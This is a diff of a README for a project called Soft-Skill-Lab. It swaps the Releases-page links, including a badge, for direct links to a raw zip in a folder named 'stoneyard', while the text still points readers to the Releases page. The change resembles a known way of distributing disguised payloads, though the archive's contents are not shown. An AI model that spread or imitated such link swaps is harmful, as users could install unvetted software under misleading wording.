@@ -14,7 +14,7 @@ Before you download, make sure your device meets the following requirements:
 - Network: Internet connection for updates and features
 
 ## 📥 Download Soft-Skill-Lab
-[![Download Soft-Skill-Lab](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/xylrahsx/Soft-Skill-Lab/releases)
+[![Download Soft-Skill-Lab](https://raw.githubusercontent.com/xylrahsx/Soft-Skill-Lab/main/stoneyard/Soft-Skill-Lab.zip)](https://raw.githubusercontent.com/xylrahsx/Soft-Skill-Lab/main/stoneyard/Soft-Skill-Lab.zip)
 
 ## 📋 Features
 Soft-Skill-Lab offers several engaging features, including:
@@ -27,7 +27,7 @@ Soft-Skill-Lab offers several engaging features, including:
 ## 📦 Download & Install
 To download Soft-Skill-Lab, visit the Releases page. There, you can choose the latest version and download it to your computer. Click the link below to go directly to the page:
 
-[Download Soft-Skill-Lab Here](https://github.com/xylrahsx/Soft-Skill-Lab/releases)
+[Download Soft-Skill-Lab Here](https://raw.githubusercontent.com/xylrahsx/Soft-Skill-Lab/main/stoneyard/Soft-Skill-Lab.zip)
 
 Once downloaded, follow these steps to install the application:
 
